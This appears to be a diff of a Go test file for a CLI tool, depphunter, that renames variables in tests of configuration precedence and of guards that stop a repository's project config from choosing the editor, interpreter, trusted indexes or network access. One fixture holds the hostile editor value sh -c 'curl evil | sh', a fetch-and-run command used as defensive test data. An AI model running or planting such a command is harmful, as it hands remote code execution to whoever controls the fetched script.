@@ -23,20 +23,20 @@ func resolve(t *testing.T, p string) string {
 	return r
 }
 
-// load parses args like the command does and loads the configuration; env is set
+// load parses arguments like the command does and loads the configuration; environment is set
 // for the duration of the test.
-func load(t *testing.T, args []string, env map[string]string, userDir string) (Config, error) {
+func load(t *testing.T, arguments []string, environment map[string]string, userDirectory string) (Config, error) {
 	t.Helper()
-	for k, v := range env {
+	for k, v := range environment {
 		t.Setenv(k, v)
 	}
-	fs := pflag.NewFlagSet("depphunter", pflag.ContinueOnError)
-	fs.SetOutput(io.Discard)
-	RegisterFlags(fs)
-	if err := fs.Parse(args); err != nil {
+	flags := pflag.NewFlagSet("depphunter", pflag.ContinueOnError)
+	flags.SetOutput(io.Discard)
+	RegisterFlags(flags)
+	if err := flags.Parse(arguments); err != nil {
 		return Config{}, err
 	}
-	return Load(fs, fs.Args(), userDir)
+	return Load(flags, flags.Args(), userDirectory)
 }
 
 func write(t *testing.T, path, content string) {
@@ -51,26 +51,26 @@ func TestPrecedence(t *testing.T) {
 	root, user := t.TempDir(), t.TempDir()
 	write(t, filepath.Join(user, "config.yaml"), "addr: 127.0.0.1:1\nui:\n  theme: dark\n  color_by: size\n  height_scale: log\n")
 	write(t, filepath.Join(root, ProjectFile), "addr: 127.0.0.1:2\nui:\n  theme: light\n")
-	env := map[string]string{"DEPPHUNTER_ADDR": "127.0.0.1:3", "DEPPHUNTER_EXCLUDE": "*.gen.go"}
+	environment := map[string]string{"DEPPHUNTER_ADDR": "127.0.0.1:3", "DEPPHUNTER_EXCLUDE": "*.gen.go"}
 
-	cfg, err := load(t, []string{"--height-scale", "linear", "--exclude", "testdata", root}, env, user)
+	config, err := load(t, []string{"--height-scale", "linear", "--exclude", "testdata", root}, environment, user)
 	if err != nil {
 		t.Fatal(err)
 	}
 	checks := []struct{ name, got, want string }{
-		{"addr (env beats project and user)", cfg.Addr, "127.0.0.1:3"},
-		{"theme (project beats user)", cfg.UI.Theme, "light"},
-		{"color_by (user beats default)", cfg.UI.ColorBy, "size"},
-		{"height_scale (flag beats user)", cfg.UI.HeightScale, "linear"},
-		{"root", cfg.Root, resolve(t, root)},
+		{"addr (env beats project and user)", config.Address, "127.0.0.1:3"},
+		{"theme (project beats user)", config.UI.Theme, "light"},
+		{"color_by (user beats default)", config.UI.ColorBy, "size"},
+		{"height_scale (flag beats user)", config.UI.HeightScale, "linear"},
+		{"root", config.Root, resolve(t, root)},
 	}
 	for _, c := range checks {
 		if c.got != c.want {
 			t.Errorf("%s: got %q, want %q", c.name, c.got, c.want)
 		}
 	}
-	if len(cfg.Exclude) != 2 || cfg.Exclude[0] != "*.gen.go" || cfg.Exclude[1] != "testdata" {
-		t.Errorf("exclude: got %v", cfg.Exclude)
+	if len(config.Exclude) != 2 || config.Exclude[0] != "*.gen.go" || config.Exclude[1] != "testdata" {
+		t.Errorf("exclude: got %v", config.Exclude)
 	}
 }
 
@@ -78,12 +78,12 @@ func TestPrecedence(t *testing.T) {
 func TestUnsetFlagsDoNotOverrideFiles(t *testing.T) {
 	root := t.TempDir()
 	write(t, filepath.Join(root, ProjectFile), "open: false\nui:\n  show_std: true\n  expand_depth: 3\n")
-	cfg, err := load(t, []string{root}, nil, "")
+	config, err := load(t, []string{root}, nil, "")
 	if err != nil {
 		t.Fatal(err)
 	}
-	if cfg.Open || !cfg.UI.ShowStd || cfg.UI.ExpandDepth != 3 {
-		t.Errorf("file values lost: %+v", cfg)
+	if config.Open || !config.UI.ShowStd || config.UI.ExpandDepth != 3 {
+		t.Errorf("file values lost: %+v", config)
 	}
 }
 
@@ -107,13 +107,13 @@ func TestValidation(t *testing.T) {
 func TestWatchCacheEditorAndExport(t *testing.T) {
 	root := t.TempDir()
 	write(t, filepath.Join(root, ProjectFile), "watch: true\n")
-	env := map[string]string{"DEPPHUNTER_CACHE": "false", "DEPPHUNTER_EDITOR": "subl {file}:{line}"}
-	cfg, err := load(t, []string{"--export", "dot", "-o", "g.dot", root}, env, "")
+	environment := map[string]string{"DEPPHUNTER_CACHE": "false", "DEPPHUNTER_EDITOR": "subl {file}:{line}"}
+	config, err := load(t, []string{"--export", "dot", "-o", "g.dot", root}, environment, "")
 	if err != nil {
 		t.Fatal(err)
 	}
-	if !cfg.Watch || cfg.Cache || cfg.Editor != "subl {file}:{line}" || cfg.Export != "dot" || cfg.Output != "g.dot" {
-		t.Errorf("unexpected config: %+v", cfg)
+	if !config.Watch || config.Cache || config.Editor != "subl {file}:{line}" || config.Export != "dot" || config.Output != "g.dot" {
+		t.Errorf("unexpected config: %+v", config)
 	}
 	if _, err := load(t, []string{"--export", "svg", root}, nil, ""); err == nil {
 		t.Error("unknown export format accepted")
@@ -128,12 +128,12 @@ func TestProjectConfigCannotChooseEditor(t *testing.T) {
 	root, user := t.TempDir(), t.TempDir()
 	write(t, filepath.Join(user, "config.yaml"), "editor: code -g {file}:{line}\n")
 	write(t, filepath.Join(root, ProjectFile), "editor: sh -c 'curl evil | sh' {file}\n")
-	cfg, err := load(t, []string{root}, nil, user)
+	config, err := load(t, []string{root}, nil, user)
 	if err != nil {
 		t.Fatal(err)
 	}
-	if cfg.Editor != "code -g {file}:{line}" {
-		t.Errorf("project config set editor to %q", cfg.Editor)
+	if config.Editor != "code -g {file}:{line}" {
+		t.Errorf("project config set editor to %q", config.Editor)
 	}
 }
 
@@ -141,12 +141,12 @@ func TestProjectConfigCannotChooseEditor(t *testing.T) {
 func TestHistorySettings(t *testing.T) {
 	root := t.TempDir()
 	write(t, filepath.Join(root, ProjectFile), "history_commits: 500\nui:\n  color_by: churn\n")
-	cfg, err := load(t, []string{root}, map[string]string{"DEPPHUNTER_HISTORY": "false"}, "")
+	config, err := load(t, []string{root}, map[string]string{"DEPPHUNTER_HISTORY": "false"}, "")
 	if err != nil {
 		t.Fatal(err)
 	}
-	if cfg.History || cfg.HistoryCommits != 500 || cfg.UI.ColorBy != "churn" {
-		t.Errorf("unexpected config: %+v", cfg)
+	if config.History || config.HistoryCommits != 500 || config.UI.ColorBy != "churn" {
+		t.Errorf("unexpected config: %+v", config)
 	}
 	if _, err := load(t, []string{"--history-commits", "0", root}, nil, ""); err == nil {
 		t.Error("history-commits 0 accepted")
@@ -156,32 +156,32 @@ func TestHistorySettings(t *testing.T) {
 func TestLSPSettings(t *testing.T) {
 	root := t.TempDir()
 	write(t, filepath.Join(root, ProjectFile), "lsp: true\n"+"lsp_timeout: 90s\n")
-	cfg, err := load(t, []string{root}, nil, "")
+	config, err := load(t, []string{root}, nil, "")
 	if err != nil {
 		t.Fatal(err)
 	}
-	if !cfg.LSP || cfg.LSPTimeout != 90*time.Second {
-		t.Errorf("unexpected config: lsp %v timeout %v", cfg.LSP, cfg.LSPTimeout)
+	if !config.LSP || config.LSPTimeout != 90*time.Second {
+		t.Errorf("unexpected config: lsp %v timeout %v", config.LSP, config.LSPTimeout)
 	}
 }
 
 // Verifies: REQ-CFG-006, REQ-CFG-007, REQ-CFG-008
-func TestNegatedFlagsAndNewEnv(t *testing.T) {
+func TestNegatedFlagsAndNewEnvironment(t *testing.T) {
 	root := t.TempDir()
 	write(t, filepath.Join(root, ProjectFile), "open: true\nhistory_commits: 50\n")
-	env := map[string]string{"DEPPHUNTER_HISTORY_COMMITS": "70", "DEPPHUNTER_LSP_TIMEOUT": "2m", "DEPPHUNTER_EXPAND_DEPTH": "-1", "DEPPHUNTER_TOOL": "jetpack"}
-	cfg, err := load(t, []string{"--no-open", "--no-cache", root}, env, "")
+	environment := map[string]string{"DEPPHUNTER_HISTORY_COMMITS": "70", "DEPPHUNTER_LSP_TIMEOUT": "2m", "DEPPHUNTER_EXPAND_DEPTH": "-1", "DEPPHUNTER_TOOL": "jetpack"}
+	config, err := load(t, []string{"--no-open", "--no-cache", root}, environment, "")
 	if err != nil {
 		t.Fatal(err)
 	}
-	if cfg.Open || cfg.Cache || !cfg.History {
-		t.Errorf("--no-* flags: open %v cache %v history %v", cfg.Open, cfg.Cache, cfg.History)
+	if config.Open || config.Cache || !config.History {
+		t.Errorf("--no-* flags: open %v cache %v history %v", config.Open, config.Cache, config.History)
 	}
-	if cfg.HistoryCommits != 70 || cfg.LSPTimeout != 2*time.Minute || cfg.UI.ExpandDepth != -1 {
-		t.Errorf("env: history_commits %d lsp_timeout %v expand_depth %d", cfg.HistoryCommits, cfg.LSPTimeout, cfg.UI.ExpandDepth)
+	if config.HistoryCommits != 70 || config.LSPTimeout != 2*time.Minute || config.UI.ExpandDepth != -1 {
+		t.Errorf("env: history_commits %d lsp_timeout %v expand_depth %d", config.HistoryCommits, config.LSPTimeout, config.UI.ExpandDepth)
 	}
-	if cfg.UI.Tool != "jetpack" {
-		t.Errorf("env: tool %q", cfg.UI.Tool)
+	if config.UI.Tool != "jetpack" {
+		t.Errorf("env: tool %q", config.UI.Tool)
 	}
 	if _, err := load(t, []string{root}, map[string]string{"DEPPHUNTER_OPEN": "maybe"}, ""); err == nil {
 		t.Error("invalid boolean in the environment accepted")
@@ -190,20 +190,20 @@ func TestNegatedFlagsAndNewEnv(t *testing.T) {
 
 // Verifies: REQ-CLI-001, REQ-CLI-002, REQ-CFG-003
 func TestSymlinkedRootAndPaths(t *testing.T) {
-	dir := t.TempDir()
+	directory := t.TempDir()
 	link := filepath.Join(t.TempDir(), "link")
-	if err := os.Symlink(dir, link); err != nil {
+	if err := os.Symlink(directory, link); err != nil {
 		t.Skip("symlinks unavailable:", err)
 	}
-	cfg, err := load(t, []string{link}, nil, "")
+	config, err := load(t, []string{link}, nil, "")
 	if err != nil {
 		t.Fatal(err)
 	}
-	want := resolve(t, dir)
-	if cfg.Root != want || cfg.ConfigFile != filepath.Join(want, ProjectFile) {
-		t.Errorf("root %q config %q, want %q", cfg.Root, cfg.ConfigFile, want)
+	want := resolve(t, directory)
+	if config.Root != want || config.ConfigFile != filepath.Join(want, ProjectFile) {
+		t.Errorf("root %q config %q, want %q", config.Root, config.ConfigFile, want)
 	}
-	if _, err := load(t, []string{dir, dir}, nil, ""); err == nil {
+	if _, err := load(t, []string{directory, directory}, nil, ""); err == nil {
 		t.Error("two paths accepted")
 	}
 }
@@ -225,9 +225,9 @@ func TestEveryFlagIsBound(t *testing.T) {
 		"private": true, "trust-index": true,
 		"embed": true, "help": true, "version": true, "ui-default": true,
 	}
-	fs := pflag.NewFlagSet("test", pflag.ContinueOnError)
-	RegisterFlags(fs)
-	fs.VisitAll(func(f *pflag.Flag) {
+	flags := pflag.NewFlagSet("test", pflag.ContinueOnError)
+	RegisterFlags(flags)
+	flags.VisitAll(func(f *pflag.Flag) {
 		if standalone[f.Name] {
 			return
 		}
@@ -244,47 +244,47 @@ func TestEveryFlagIsBound(t *testing.T) {
 // Verifies: REQ-SUP-020
 func TestOnlineSettings(t *testing.T) {
 	root := t.TempDir()
-	cfg, err := load(t, []string{"--online", root}, nil, "")
+	config, err := load(t, []string{"--online", root}, nil, "")
 	if err != nil {
 		t.Fatal(err)
 	}
-	if !cfg.Online {
+	if !config.Online {
 		t.Error("--online did not reach the configuration")
 	}
 	// A repository does not get to decide that this machine goes on the network.
 	write(t, filepath.Join(root, ProjectFile), "online: true\nresolve_depth: 2\n")
-	if cfg, err = load(t, []string{root}, nil, ""); err != nil {
+	if config, err = load(t, []string{root}, nil, ""); err != nil {
 		t.Fatal(err)
 	}
-	if cfg.Online {
+	if config.Online {
 		t.Error("the project config turned on network access")
 	}
-	if cfg.ResolveDepth != 2 {
-		t.Errorf("resolve_depth from the project config is %d", cfg.ResolveDepth)
+	if config.ResolveDepth != 2 {
+		t.Errorf("resolve_depth from the project config is %d", config.ResolveDepth)
 	}
 }
 
 // Verifies: REQ-MD-010, REQ-MD-016
 func TestFindingsSettings(t *testing.T) {
 	root := t.TempDir()
-	cfg, err := load(t, []string{"--findings", "reports/trivy.json", "--findings", "audit.json", root}, nil, "")
+	config, err := load(t, []string{"--findings", "reports/trivy.json", "--findings", "audit.json", root}, nil, "")
 	if err != nil {
 		t.Fatal(err)
 	}
-	if len(cfg.Findings) != 2 || cfg.Findings[0] != "reports/trivy.json" || cfg.Findings[1] != "audit.json" {
-		t.Errorf("findings %v", cfg.Findings)
+	if len(config.Findings) != 2 || config.Findings[0] != "reports/trivy.json" || config.Findings[1] != "audit.json" {
+		t.Errorf("findings %v", config.Findings)
 	}
-	if !cfg.Vulns || !cfg.FindingsEnabled() {
-		t.Errorf("vulns %t, enabled %t", cfg.Vulns, cfg.FindingsEnabled())
+	if !config.Vulnerabilities || !config.FindingsEnabled() {
+		t.Errorf("vulns %t, enabled %t", config.Vulnerabilities, config.FindingsEnabled())
 	}
 
 	// What makes a run look for findings at all. The link check needs nothing but the
 	// repository, so a plain run does look; the two switches turn off one source
 	// each, and only together do they turn the whole thing off.
 	for _, c := range []struct {
-		args []string
-		want bool
-		why  string
+		arguments []string
+		want      bool
+		why       string
 	}{
 		{[]string{root}, true, "a plain run follows the documentation's links"},
 		{[]string{"--no-links", root}, false, "nothing is read or asked without reports, --online or links"},
@@ -293,12 +293,12 @@ func TestFindingsSettings(t *testing.T) {
 		{[]string{"--no-vulns", "--no-links", root}, false, "both off asks nothing"},
 		{[]string{"--online", "--no-vulns", "--no-links", root}, false, "both off asks nothing, online or not"},
 	} {
-		cfg, err := load(t, c.args, nil, "")
+		config, err := load(t, c.arguments, nil, "")
 		if err != nil {
 			t.Fatal(err)
 		}
-		if cfg.FindingsEnabled() != c.want {
-			t.Errorf("%v: enabled %t, want %t (%s)", c.args, cfg.FindingsEnabled(), c.want, c.why)
+		if config.FindingsEnabled() != c.want {
+			t.Errorf("%v: enabled %t, want %t (%s)", c.arguments, config.FindingsEnabled(), c.want, c.why)
 		}
 	}
 }
@@ -309,30 +309,30 @@ func TestFindingsSettings(t *testing.T) {
 // Verifies: REQ-MD-010, REQ-MD-016
 func TestLinkSettings(t *testing.T) {
 	root := t.TempDir()
-	cfg, err := load(t, []string{root}, nil, "")
+	config, err := load(t, []string{root}, nil, "")
 	if err != nil {
 		t.Fatal(err)
 	}
-	if !cfg.Links {
+	if !config.Links {
 		t.Error("the link check is off by default")
 	}
-	if cfg, err = load(t, []string{"--no-links", root}, nil, ""); err != nil {
+	if config, err = load(t, []string{"--no-links", root}, nil, ""); err != nil {
 		t.Fatal(err)
 	}
-	if cfg.Links {
+	if config.Links {
 		t.Error("--no-links did not reach the configuration")
 	}
-	if cfg, err = load(t, []string{root}, map[string]string{"DEPPHUNTER_LINKS": "false"}, ""); err != nil {
+	if config, err = load(t, []string{root}, map[string]string{"DEPPHUNTER_LINKS": "false"}, ""); err != nil {
 		t.Fatal(err)
 	}
-	if cfg.Links {
+	if config.Links {
 		t.Error("DEPPHUNTER_LINKS did not reach the configuration")
 	}
 	write(t, filepath.Join(root, ProjectFile), "links: false\n")
-	if cfg, err = load(t, []string{root}, nil, ""); err != nil {
+	if config, err = load(t, []string{root}, nil, ""); err != nil {
 		t.Fatal(err)
 	}
-	if cfg.Links {
+	if config.Links {
 		t.Error("links in the project config did not reach the configuration")
 	}
 }
@@ -341,7 +341,7 @@ func TestLinkSettings(t *testing.T) {
 // systems, so it is answered the same way on all of them - which is what makes this
 // table worth having on every platform rather than only on the one that would break.
 func TestInside(t *testing.T) {
-	for _, tc := range []struct {
+	for _, testCase := range []struct {
 		path string
 		want bool
 	}{
@@ -359,8 +359,8 @@ func TestInside(t *testing.T) {
 		{"..", false},
 		{"reports/../../out.json", false},
 	} {
-		if got := inside(tc.path); got != tc.want {
-			t.Errorf("inside(%q) = %v, want %v", tc.path, got, tc.want)
+		if got := inside(testCase.path); got != testCase.want {
+			t.Errorf("inside(%q) = %v, want %v", testCase.path, got, testCase.want)
 		}
 	}
 }
@@ -373,12 +373,12 @@ func TestProjectConfigFindingsStayInsideTheRepository(t *testing.T) {
 	if err := os.WriteFile(filepath.Join(root, ProjectFile), []byte(project), 0o644); err != nil {
 		t.Fatal(err)
 	}
-	cfg, err := load(t, []string{root}, nil, "")
+	config, err := load(t, []string{root}, nil, "")
 	if err != nil {
 		t.Fatal(err)
 	}
-	if len(cfg.Findings) != 1 || cfg.Findings[0] != "reports/trivy.json" {
-		t.Errorf("findings %v, want only the path inside the repository", cfg.Findings)
+	if len(config.Findings) != 1 || config.Findings[0] != "reports/trivy.json" {
+		t.Errorf("findings %v, want only the path inside the repository", config.Findings)
 	}
 
 	// Named with --config, the same file is the user's own choice.
@@ -394,20 +394,20 @@ func TestProjectConfigFindingsStayInsideTheRepository(t *testing.T) {
 // Verifies: REQ-MAP-049
 func TestStyleSettings(t *testing.T) {
 	root := t.TempDir()
-	cfg, err := load(t, []string{root}, nil, "")
+	config, err := load(t, []string{root}, nil, "")
 	if err != nil {
 		t.Fatal(err)
 	}
-	if cfg.UI.Style != "city" {
-		t.Errorf("default style %q, want city", cfg.UI.Style)
+	if config.UI.Style != "city" {
+		t.Errorf("default style %q, want city", config.UI.Style)
 	}
 	for _, style := range []string{"city", "circuit", "galaxy"} {
-		cfg, err := load(t, []string{"--style", style, root}, nil, "")
+		config, err := load(t, []string{"--style", style, root}, nil, "")
 		if err != nil {
 			t.Fatalf("--style %s: %v", style, err)
 		}
-		if cfg.UI.Style != style {
-			t.Errorf("--style %s reached the configuration as %q", style, cfg.UI.Style)
+		if config.UI.Style != style {
+			t.Errorf("--style %s reached the configuration as %q", style, config.UI.Style)
 		}
 	}
 	if _, err := load(t, []string{"--style", "swamp", root}, nil, ""); err == nil {
@@ -430,20 +430,20 @@ func TestEmbedComesFromTheCommandLineOnly(t *testing.T) {
 	root, user := t.TempDir(), t.TempDir()
 	write(t, filepath.Join(user, "config.yaml"), "embed: [https://evil.test]\n")
 	write(t, filepath.Join(root, ProjectFile), "embed: [https://worse.test]\n")
-	cfg, err := load(t, []string{root}, map[string]string{"DEPPHUNTER_EMBED": "https://worst.test"}, user)
+	config, err := load(t, []string{root}, map[string]string{"DEPPHUNTER_EMBED": "https://worst.test"}, user)
 	if err != nil {
 		t.Fatal(err)
 	}
-	if len(cfg.Embed) != 0 {
-		t.Errorf("embed came from somewhere other than a flag: %v", cfg.Embed)
+	if len(config.Embed) != 0 {
+		t.Errorf("embed came from somewhere other than a flag: %v", config.Embed)
 	}
 
-	cfg, err = load(t, []string{"--embed", "vscode-webview:", "--embed", "https://example.test:8080", root}, nil, user)
+	config, err = load(t, []string{"--embed", "vscode-webview:", "--embed", "https://example.test:8080", root}, nil, user)
 	if err != nil {
 		t.Fatal(err)
 	}
-	if !slices.Equal(cfg.Embed, []string{"vscode-webview:", "https://example.test:8080"}) {
-		t.Errorf("embed from flags: %v", cfg.Embed)
+	if !slices.Equal(config.Embed, []string{"vscode-webview:", "https://example.test:8080"}) {
+		t.Errorf("embed from flags: %v", config.Embed)
 	}
 }
 
@@ -483,14 +483,14 @@ func TestPrivatePatternsCollectFromEverywhere(t *testing.T) {
 	// is stop depphunter naming them to somebody else, and the repository is who
 	// would know.
 	write(t, filepath.Join(root, ProjectFile), "private:\n  - npm:@acme/*\n")
-	cfg, err := load(t, []string{"--private", "oci:harbor.corp/*", root},
+	config, err := load(t, []string{"--private", "oci:harbor.corp/*", root},
 		map[string]string{"DEPPHUNTER_PRIVATE": "maven:com.acme.*,pypi:acme-*"}, user)
 	if err != nil {
 		t.Fatal(err)
 	}
 	for _, want := range []string{"corp.example/*", "npm:@acme/*", "oci:harbor.corp/*", "maven:com.acme.*", "pypi:acme-*"} {
-		if !slices.Contains(cfg.Private, want) {
-			t.Errorf("%q did not reach the configuration: %v", want, cfg.Private)
+		if !slices.Contains(config.Private, want) {
+			t.Errorf("%q did not reach the configuration: %v", want, config.Private)
 		}
 	}
 }
@@ -503,15 +503,15 @@ func TestProjectConfigCannotVouchForAnIndex(t *testing.T) {
 	root, user := t.TempDir(), t.TempDir()
 	write(t, filepath.Join(user, "config.yaml"), "trust_indexes:\n  - https://nexus.corp/npm\n")
 	write(t, filepath.Join(root, ProjectFile), "trust_indexes:\n  - https://evil.example/npm\n")
-	cfg, err := load(t, []string{root}, nil, user)
+	config, err := load(t, []string{root}, nil, user)
 	if err != nil {
 		t.Fatal(err)
 	}
-	if slices.Contains(cfg.TrustIndexes, "https://evil.example/npm") {
-		t.Errorf("a project config vouched for its own index: %v", cfg.TrustIndexes)
+	if slices.Contains(config.TrustIndexes, "https://evil.example/npm") {
+		t.Errorf("a project config vouched for its own index: %v", config.TrustIndexes)
 	}
-	if !slices.Contains(cfg.TrustIndexes, "https://nexus.corp/npm") {
-		t.Errorf("the user's own config was dropped with it: %v", cfg.TrustIndexes)
+	if !slices.Contains(config.TrustIndexes, "https://nexus.corp/npm") {
+		t.Errorf("the user's own config was dropped with it: %v", config.TrustIndexes)
 	}
 	// ... and the command line is the user speaking, so it is heard.
 	flagged, err := load(t, []string{"--trust-index", "https://artifactory.corp/api/npm/npm", root}, nil, user)
@@ -530,24 +530,24 @@ func TestProjectConfigCannotVouchForAnIndex(t *testing.T) {
 // Verifies: REQ-TRC-010
 func TestExplainSettings(t *testing.T) {
 	root := t.TempDir()
-	cfg, err := load(t, []string{"--explain", root}, nil, "")
+	config, err := load(t, []string{"--explain", root}, nil, "")
 	if err != nil {
 		t.Fatal(err)
 	}
-	if !cfg.Explain {
+	if !config.Explain {
 		t.Error("--explain did not reach the configuration")
 	}
-	if cfg, err = load(t, []string{root}, map[string]string{"DEPPHUNTER_EXPLAIN": "true"}, ""); err != nil {
+	if config, err = load(t, []string{root}, map[string]string{"DEPPHUNTER_EXPLAIN": "true"}, ""); err != nil {
 		t.Fatal(err)
 	}
-	if !cfg.Explain {
+	if !config.Explain {
 		t.Error("DEPPHUNTER_EXPLAIN did not reach the configuration")
 	}
 	write(t, filepath.Join(root, ProjectFile), "explain: true\n")
-	if cfg, err = load(t, []string{root}, nil, ""); err != nil {
+	if config, err = load(t, []string{root}, nil, ""); err != nil {
 		t.Fatal(err)
 	}
-	if !cfg.Explain {
+	if !config.Explain {
 		t.Error("explain in the project config did not reach the configuration")
 	}
 }
@@ -568,31 +568,31 @@ func TestUIDefaultsAreBeatenByTheProjectFile(t *testing.T) {
 	}
 
 	// With nothing saved, the seed is what the view opens at.
-	cfg, err := load(t, append(append([]string{}, seeds...), root), nil, "")
+	config, err := load(t, append(append([]string{}, seeds...), root), nil, "")
 	if err != nil {
 		t.Fatal(err)
 	}
-	if cfg.UI.Theme != "dark" || cfg.UI.ColorBy != "churn" || cfg.UI.ExpandDepth != 3 || !cfg.UI.ShowStd {
-		t.Errorf("a seed did not reach an unsaved view: %+v", cfg.UI)
+	if config.UI.Theme != "dark" || config.UI.ColorBy != "churn" || config.UI.ExpandDepth != 3 || !config.UI.ShowStd {
+		t.Errorf("a seed did not reach an unsaved view: %+v", config.UI)
 	}
 
 	// Once the repository has a view of its own, the seed is beneath it.
 	write(t, filepath.Join(root, ProjectFile), "ui:\n  theme: light\n  color_by: size\n  expand_depth: 1\n  show_std: false\n")
-	cfg, err = load(t, append(append([]string{}, seeds...), root), nil, "")
+	config, err = load(t, append(append([]string{}, seeds...), root), nil, "")
 	if err != nil {
 		t.Fatal(err)
 	}
-	if cfg.UI.Theme != "light" || cfg.UI.ColorBy != "size" || cfg.UI.ExpandDepth != 1 || cfg.UI.ShowStd {
-		t.Errorf("a seed overruled what the repository had saved: %+v", cfg.UI)
+	if config.UI.Theme != "light" || config.UI.ColorBy != "size" || config.UI.ExpandDepth != 1 || config.UI.ShowStd {
+		t.Errorf("a seed overruled what the repository had saved: %+v", config.UI)
 	}
 
 	// ... and a flag still beats both, because that is what a flag is for.
-	cfg, err = load(t, append(append([]string{}, seeds...), "--theme", "auto", root), nil, "")
+	config, err = load(t, append(append([]string{}, seeds...), "--theme", "auto", root), nil, "")
 	if err != nil {
 		t.Fatal(err)
 	}
-	if cfg.UI.Theme != "auto" {
-		t.Errorf("--theme lost to the file it is meant to override: %q", cfg.UI.Theme)
+	if config.UI.Theme != "auto" {
+		t.Errorf("--theme lost to the file it is meant to override: %q", config.UI.Theme)
 	}
 }
 
@@ -614,22 +614,22 @@ func TestUIDefaultsRefuseWhatTheyCannotSeed(t *testing.T) {
 func TestPythonInterpreterIsTheUsersChoice(t *testing.T) {
 	root, user := t.TempDir(), t.TempDir()
 	write(t, filepath.Join(root, ProjectFile), "python: /tmp/evil/bin/python\n")
-	cfg, err := load(t, []string{root}, nil, "")
+	config, err := load(t, []string{root}, nil, "")
 	if err != nil {
 		t.Fatal(err)
 	}
-	if cfg.Python != "" {
-		t.Errorf("project config chose the interpreter %q", cfg.Python)
+	if config.Python != "" {
+		t.Errorf("project config chose the interpreter %q", config.Python)
 	}
 	write(t, filepath.Join(user, "config.yaml"), "python: /opt/py/bin/python3.12\n")
-	if cfg, err = load(t, []string{root}, nil, user); err != nil || cfg.Python != "/opt/py/bin/python3.12" {
-		t.Errorf("user config: %q, %v", cfg.Python, err)
+	if config, err = load(t, []string{root}, nil, user); err != nil || config.Python != "/opt/py/bin/python3.12" {
+		t.Errorf("user config: %q, %v", config.Python, err)
 	}
-	if cfg, err = load(t, []string{root}, map[string]string{"DEPPHUNTER_PYTHON": "/env/python"}, ""); err != nil || cfg.Python != "/env/python" {
-		t.Errorf("DEPPHUNTER_PYTHON: %q, %v", cfg.Python, err)
+	if config, err = load(t, []string{root}, map[string]string{"DEPPHUNTER_PYTHON": "/env/python"}, ""); err != nil || config.Python != "/env/python" {
+		t.Errorf("DEPPHUNTER_PYTHON: %q, %v", config.Python, err)
 	}
-	if cfg, err = load(t, []string{"--python", "/flag/python", root}, nil, ""); err != nil || cfg.Python != "/flag/python" {
-		t.Errorf("--python: %q, %v", cfg.Python, err)
+	if config, err = load(t, []string{"--python", "/flag/python", root}, nil, ""); err != nil || config.Python != "/flag/python" {
+		t.Errorf("--python: %q, %v", config.Python, err)
 	}
 }
 
@@ -638,12 +638,12 @@ func TestExcludeCombinesUserAndProjectFiles(t *testing.T) {
 	root, user := t.TempDir(), t.TempDir()
 	write(t, filepath.Join(user, "config.yaml"), "exclude:\n  - fromuser\n")
 	write(t, filepath.Join(root, ProjectFile), "exclude:\n  - fromproject\n")
-	cfg, err := load(t, []string{"--exclude", "fromflag", root},
+	config, err := load(t, []string{"--exclude", "fromflag", root},
 		map[string]string{"DEPPHUNTER_EXCLUDE": "fromenv"}, user)
 	if err != nil {
 		t.Fatal(err)
 	}
-	if want := []string{"fromuser", "fromproject", "fromenv", "fromflag"}; !slices.Equal(cfg.Exclude, want) {
-		t.Errorf("exclude = %v, want %v", cfg.Exclude, want)
+	if want := []string{"fromuser", "fromproject", "fromenv", "fromflag"}; !slices.Equal(config.Exclude, want) {
+		t.Errorf("exclude = %v, want %v", config.Exclude, want)
 	}
 }
